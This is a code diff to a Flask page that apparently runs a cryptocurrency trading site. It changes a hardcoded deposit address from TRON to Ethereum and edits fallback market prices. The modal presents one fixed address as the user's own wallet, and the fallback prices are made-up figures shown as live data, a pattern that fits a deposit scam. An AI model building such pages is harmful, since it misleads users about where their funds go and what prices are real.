@@ -10,7 +10,7 @@ from functools import wraps
 
 # ---------- CONFIG ----------
 WALLET_ADDRESS = "0x0DaCbaCC5814C375eB644A10E62832D6D3aA9597"
-NETWORK_LABEL = "Ethereum ( ERC20 )"
+NETWORK_LABEL = "ethereum ( ERC20 )"
 
 VS_CURRENCY = "usd"
 FETCH_INTERVAL = 30         # Reduced API calls to avoid bans
@@ -26,7 +26,7 @@ app.secret_key = os.environ.get("FLASK_SECRET_KEY") or secrets.token_hex(24)
 # --- HARDCODED ROBUST INITIAL MARKET ---
 # This ensures the screen is NEVER empty, even if the API fails.
 INITIAL_MARKET = {
-    "BTC": {"id": "bitcoin", "symbol": "BTC", "name": "Bitcoin", "price": 72450.20, "change_24h": 2.5, "image": "https://assets.coingecko.com/coins/images/1/large/bitcoin.png"},
+    "BTC": {"id": "bitcoin", "symbol": "BTC", "name": "Bitcoin", "price": 68450.20, "change_24h": 2.5, "image": "https://assets.coingecko.com/coins/images/1/large/bitcoin.png"},
     "ETH": {"id": "ethereum", "symbol": "ETH", "name": "Ethereum", "price": 3850.10, "change_24h": 1.2, "image": "https://assets.coingecko.com/coins/images/279/large/ethereum.png"},
     "SOL": {"id": "solana", "symbol": "SOL", "name": "Solana", "price": 175.40, "change_24h": 5.4, "image": "https://assets.coingecko.com/coins/images/4128/large/solana.png"},
     "BNB": {"id": "binancecoin", "symbol": "BNB", "name": "BNB", "price": 590.30, "change_24h": -0.5, "image": "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png"},
@@ -510,12 +510,12 @@ body{margin:0;font-family:'Inter',sans-serif;background:var(--bg);color:var(--te
       <div style="background:var(--bg); padding:20px; border-radius:12px; margin-bottom:16px;">
           <div class="text-muted" style="margin-bottom:12px; font-weight:600; font-size:14px;">your wallet address :</div>
           <div style="display:flex; justify-content:space-between; align-items:center; background:var(--card); padding:16px; border-radius:8px; border:1px solid var(--border);">
-              <span id="depAddress" style="font-family:monospace; font-size:14px; word-break:break-all; color:var(--text); font-weight:700;">TAMvBeCmd9VruNxPGjNamMR2wL9EMHNVnU</span>
+              <span id="depAddress" style="font-family:monospace; font-size:14px; word-break:break-all; color:var(--text); font-weight:700;">0x0DaCbaCC5814C375eB644A10E62832D6D3aA9597</span>
               <div onclick="copyDepAddress()" style="background:rgba(252, 213, 53, 0.1); padding:10px; border-radius:8px; cursor:pointer; margin-left:16px; transition:0.2s;">
                   <i class="fa-regular fa-copy" style="color:var(--accent); font-size:20px;"></i>
               </div>
           </div>
-          <div class="text-muted" style="margin-top:20px; font-weight:600; font-size:14px;">The network : TRX ( TRC20 )</div>
+          <div class="text-muted" style="margin-top:20px; font-weight:600; font-size:14px;">The network : Ethereum ( ERC20 )</div>
       </div>
       <div id="copyMsg" class="text-green" style="text-align:center; font-size:14px; font-weight:700; height:20px;"></div>
     </div>
@@ -659,7 +659,7 @@ function showToast(msg) {
 // Deposit Logic
 function openDepositModal() { document.getElementById('depositModal').classList.add('show'); }
 function copyDepAddress() {
-    navigator.clipboard.writeText("TAMvBeCmd9VruNxPGjNamMR2wL9EMHNVnU");
+    navigator.clipboard.writeText("0x0DaCbaCC5814C375eB644A10E62832D6D3aA9597");
     const msg = document.getElementById('copyMsg');
     msg.innerText = "Address Copied Successfuly!";
     setTimeout(() => { msg.innerText = ""; }, 2500);
